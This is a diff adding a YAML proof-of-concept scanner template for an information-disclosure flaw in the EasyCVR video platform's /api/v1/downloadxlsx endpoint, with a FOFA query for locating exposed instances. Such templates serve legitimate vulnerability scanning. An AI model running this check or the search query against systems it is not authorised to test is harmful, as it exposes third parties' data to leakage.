@@ -1,0 +1,15 @@
+id: poc-yaml-easy-cvr-downloadxlsx-info-leak
+info:
+  name: EasyCVR视频管理平台 downloadxlsx 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: EasyCVR
+  fofa: title="EasyCVR"
+requests:
+- method: GET
+  path: /api/v1/downloadxlsx
+  expression: status_code == 200 && !contains(body,"<html") && contains(headers,"application/octet-stream")
+    && matches(headers,"filename=([0-9a-zA-Z_]+).xlsx")
+variables: {}
+transport: http
